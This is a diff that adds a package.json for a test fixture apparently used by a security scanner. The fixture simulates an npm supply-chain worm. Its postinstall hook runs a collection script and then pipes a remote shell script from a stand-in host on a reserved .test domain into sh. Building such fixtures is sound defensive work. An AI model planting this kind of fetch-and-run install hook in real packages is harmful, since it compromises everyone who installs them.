@@ -1,0 +1,8 @@
+{
+  "name": "binshield-fixture-worm",
+  "version": "1.0.0",
+  "description": "TEST FIXTURE — simulates an npm install-script supply-chain worm. Not real malware; endpoints use the reserved .test TLD and are non-routable.",
+  "scripts": {
+    "postinstall": "node scripts/collect.js && curl -s https://staging.evil.example.test/stage2.sh | sh"
+  }
+}
